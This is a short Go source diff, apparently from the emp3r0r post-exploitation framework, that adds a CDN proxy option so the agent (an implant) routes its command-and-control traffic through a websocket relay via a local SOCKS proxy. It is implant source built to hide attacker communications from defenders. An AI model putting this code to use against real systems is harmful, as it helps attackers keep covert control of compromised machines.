@@ -13,10 +13,12 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent"
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 )
 
 func main() {
 	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
+	cdnProxy := flag.String("cdnproxy", "wss://example.com/", "CDN proxy for emp3r0r agent's C2 communication")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	flag.Parse()
@@ -87,9 +89,21 @@ func main() {
 		}
 		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
 	}
+
 	// if user specified a proxy, use it
 	if *c2proxy != "" {
 		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
+	}
+
+	// if user wants to use CDN proxy
+	if *cdnProxy != "" {
+		go func() {
+			err := cdn2proxy.StartProxy("127.0.0.1:10888", *cdnProxy)
+			if err != nil {
+				log.Fatal(err)
+			}
+		}()
+		agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:10888")
 	}
 connect:
 
